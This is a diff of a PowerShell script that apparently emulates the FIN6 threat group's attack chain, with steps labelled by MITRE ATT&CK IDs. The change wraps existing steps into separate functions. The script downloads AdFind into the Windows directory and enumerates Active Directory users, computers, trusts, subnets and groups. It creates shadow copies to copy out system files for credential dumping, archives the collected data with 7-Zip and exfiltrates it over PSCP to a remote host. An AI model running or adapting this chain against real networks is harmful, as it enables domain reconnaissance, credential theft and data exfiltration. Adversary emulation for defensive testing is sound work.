@@ -1,4 +1,3 @@
-﻿
 <#
 .NOTES
     Author:  @kengentenerende
@@ -44,6 +43,7 @@ param(
 Get-Param @PSBoundParameters
 
 #Download AdFind to Windows directory
+function Get-AdFind{
 $postParams = @{B1='Download+Now';download="AdFind.zip";email=''};
 Invoke-WebRequest -Uri http://www.joeware.net/downloads/dl2.php -Method POST -Body $postParams -OutFile C:\Users\Public\adfind.zip;
 Expand-Archive -Path C:\Users\Public\adfind.zip -DestinationPath C:\Users\Public -Force;
@@ -51,8 +51,10 @@ Move-Item -Path C:\Users\Public\AdFind.exe -Destination C:\Windows\AdFind.exe -F
 Remove-Item -Path C:\Users\Public\adfind.zip -Force;
 Remove-Item -Path C:\Users\Public\adcsv.pl -Force;
 Write-Host "[+] Downloaded AdFind to Windows directory" -ForegroundColor Green;
+}
 
 # List of ad_* Files
+function Get-AdContainer{
 $adfilePaths = @(
 ".\ad_users.txt",
 ".\ad_users_alt.txt",
@@ -78,18 +80,24 @@ foreach ($aditem in $adfilePaths){
         Write-Host "File created at $aditem"
     }
 }
+
 Write-Host "`n[+] File Container Creation Completed]" -ForegroundColor Green;
+}
 
 # Account Discovery: Domain Account (T1087.002)
+function Get-DomainAccount{
 Start-Process -FilePath "cmd" -ArgumentList "/c AdFind -f (objectcategory=person) > ad_users.txt";
 Write-Host "`n[+] Person Objects Discovery Completed: [FIN6]" -ForegroundColor Green;
 Get-Content ad_users.txt | Select-String "dn:CN=";
 
+
 net user /domain > ad_users_alt.txt;
 Write-Host "`n[+] Person Objects Discovery Completed: [Alternative]" -ForegroundColor Green;
 type ad_users_alt.txt;
+}
 
 # Remote System Discovery (T1018)
+function Get-RemoteSystem{
 Start-Process -FilePath "cmd" -ArgumentList "/c AdFind -f (objectcategory=computer) > ad_computers.txt";
 Write-Host "`n[+] Workstation and Server Discovery Completed: [FIN6]" -ForegroundColor Green;
 Get-Content ad_computers.txt | Select-String "dn:CN=";
@@ -97,8 +105,10 @@ Get-Content ad_computers.txt | Select-String "dn:CN=";
 net group "Domain Computers" /domain > ad_computers_alt.txt
 Write-Host "`n[+] Workstation and Server Discovery Completed: [Alternative]" -ForegroundColor Green;
 type ad_computers_alt.txt;
+}
 
 # Domain Trust Discovery (T1482)
+function Get-DomainTrust{
 Start-Process -FilePath "cmd" -ArgumentList "/c AdFind -f (objectcategory=organizationalUnit) > ad_ous.txt";
 Write-Host "`n[+] Organizational Units (OUs) Discovery Completed: [FIN6]" -ForegroundColor Green;
 Get-Content ad_ous.txt | Select-String "dn:OU=";
@@ -106,17 +116,22 @@ Get-Content ad_ous.txt | Select-String "dn:OU=";
 Get-ADOrganizationalUnit -Filter 'Name -like "*"' | Format-Table Name, DistinguishedName -A > ad_ous_alt.txt;
 Write-Host "`n[+] Organizational Units (OUs) Discovery Completed: [Alternative]" -ForegroundColor Green;
 type ad_ous_alt.txt;
+}
 
 # Domain Trust Discovery - Full Forest(T1482)
+function Get-ForestDomainTrust{
 Start-Process -FilePath "cmd" -ArgumentList "/c AdFind -gcb -sc trustdmp > ad_trustdmp.txt";
 Write-Host "`n[+] Full Forest Organizational Units (OUs) Discovery Completed: [FIN6]" -ForegroundColor Green;
 Get-Content ad_trustdmp.txt | Select-String "Using server:";
 
+
 nltest /domain_trusts > ad_trustdmp_alt.txt
 Write-Host "`n[+] Full Forest Organizational Units (OUs) Discovery Completed: [Alternative]" -ForegroundColor Green;
 type ad_trustdmp_alt.txt;
+}
 
 # System Network Configuration Discovery (T1016)
+function Get-SystemNet{
 Start-Process -FilePath "cmd" -ArgumentList "/c AdFind -subnets -f (objectcategory=subnet) > ad_subnets.txt";
 Write-Host "`n[+] Subnet Discovery Completed: [FIN6]" -ForegroundColor Green;
 Get-Content ad_subnets.txt
@@ -124,8 +139,10 @@ Get-Content ad_subnets.txt
 Get-ADReplicationSubnet -Filter * > ad_subnets_alt.txt
 Write-Host "`n[+] Subnet Discovery Completed: [Alternative]" -ForegroundColor Green;
 type ad_subnets_alt.txt;
+}
 
 # Permission Groups Discovery: Domain Groups (T1069.002)
+function Get-GroupPerm{
 Start-Process -FilePath "cmd" -ArgumentList "/c AdFind -f (objectcategory=group) > ad_group.txt";
 Write-Host "`n[+] Permission Groups Discovery Completed: [FIN6]" -ForegroundColor Green;
 Get-Content ad_group.txt
@@ -133,7 +150,9 @@ Get-Content ad_group.txt
 net group /domain > ad_group_alt.txt
 Write-Host "`n[+] Permission Groups Discovery Completed: [Alternative]" -ForegroundColor Green;
 type ad_group_alt.txt;
+}
 
+function Get-OSCredDump{
 #Get Shadow Copy
 $processInfo = New-Object System.Diagnostics.ProcessStartInfo
 $processInfo.Filename = "cmd.exe"
@@ -186,7 +205,10 @@ Start-Process -FilePath "cmd" -ArgumentList "/c copy $osshadname_result\windows\
 Write-Host "`n[+] System Configuration Discovery Completed: [FIN6]" -ForegroundColor Green;
 
 Write-Host "`n[+] OS Credential Discovery Completed: [FIN6]" -ForegroundColor Green;
+}
 
+
+function Get-CollectArc{
 # Download 7zip
 Invoke-WebRequest -Uri https://www.7-zip.org/a/7z2301-x64.exe -OutFile .\7.exe
 Start-Process -FilePath "cmd" -ArgumentList "/c 7.exe /S";
@@ -219,7 +241,9 @@ Write-Host "`nStandard Error:"
 Write-Host $errorOutput_arc
 
 Write-Host "`n[+] Archive Collection Completed: [FIN6]" -ForegroundColor Green;
+}
 
+function Get-ExfilPscp{
 # Download PSCP
 $finalHost = $resultHost+":"
 Write-Host "`n[+] FinalHost: $finalHost" -ForegroundColor Red;
@@ -255,5 +279,21 @@ Write-Host $errorOutput
 #--------------------------------------------------------------------------------------------------------
 
 Write-Host "`n[+] Exfiltration Using PSCP Completed: [Alternative]" -ForegroundColor Green;
-Write-Host "`n[+] Operation Complete" -ForegroundColor Green;
+}
 
+
+# UNCOMMENT TO RUN FUNCTIONS HERE
+
+#Get-AdContainer
+#Get-AdFind
+#Get-DomainAccount
+#Get-RemoteSystem
+#Get-DomainTrust
+#Get-ForestDomainTrust
+#Get-SystemNet
+#Get-GroupPerm
+#Get-OSCredDump
+#Get-CollectArc
+#Get-ExfilPscp
+
+Write-Host "`n[+] Operation Complete" -ForegroundColor Green;
